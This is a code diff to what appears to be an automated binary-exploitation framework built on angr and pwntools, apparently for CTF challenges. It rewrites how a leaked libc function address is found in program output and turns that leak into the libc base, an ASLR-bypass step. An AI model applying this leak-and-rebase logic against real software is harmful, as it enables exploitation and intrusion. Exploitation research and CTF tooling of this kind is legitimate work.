@@ -78,7 +78,7 @@ class MitigatePIEPuts:
                     rec += binary.warped_io(state)
             if self.pattern in rec:
                 base = binary.rle(rec.split(self.pattern)[1][:6 if ab == 8 else 4].ljust(ab, b'\x00'))
-                if base >> 40 == 0x7f:
+                if base >> 44 == 0x7:
                     base -= 243  # can be done automatically
                     log.info(f"__libc_start_main is leaked as {hex(base)}")
                     libc = ELF(binary.libc, checksec=False)
@@ -155,22 +155,24 @@ def _leak_got(state_raw: angr.SimState, challenge, new_mem: list, align_=False):
         payload = dump_payload(state, True)
         _ = binary.send_payload(state, payload)
         try:
-            if arch_bytes == 8:
-                rec = binary.warped_io(state)
-                rec = rec[:rec.index(b'\x7f') + 1]
-                leak_addr = u64(rec[-6:].ljust(8, b'\x00'))
-            else:
-                rec = binary.warped_io(state)
-                rec = rec[:rec.index(b'\xf7') + 1]
-                leak_addr = u32(rec[-4:])
-            log.success(f"Leak libc func address: {hex(leak_addr)}")
-            libc_base = leak_addr - ELF(binary.libc, checksec=False).sym[use_function]
-            log.success(f"Got libc base address: {hex(libc_base)}")
-            binary.io_seg_addr['libc'] = libc_base
-            tail = binary.warped_io(state, check_alive=False)
-            if tail:
-                log.info(f"Have tail: {tail}")
-            return binary
+            rec = binary.warped_io(state)
+            function_base = ELF(binary.libc, checksec=False).sym[use_function]
+            for offset in range(0, len(rec) - 4):
+                if arch_bytes == 8:  # assume there at least one none-printable char
+                    if all([31 < i < 127 for i in rec[offset:offset + 6]]):
+                        continue
+                    leak_addr = u64(rec[offset:offset + 6].ljust(8, b'\x00'))
+                else:
+                    leak_addr = u32(rec[offset:offset + 4])
+                if (leak_addr ^ function_base) & 0xfff == 0 and leak_addr > (0xe << 28 if arch_bytes < 8 else 7 << 44):
+                    log.success(f"Leak libc func address: {hex(leak_addr)}")
+                    libc_base = leak_addr - function_base
+                    log.success(f"Got libc base address: {hex(libc_base)}")
+                    binary.io_seg_addr['libc'] = libc_base
+                    tail = binary.warped_io(state, check_alive=False)
+                    if tail:
+                        log.info(f"Have tail: {tail}")
+                    return binary
         except ValueError:
             log.failure(f"Failed to get leak address.")
     except PwnlibException:
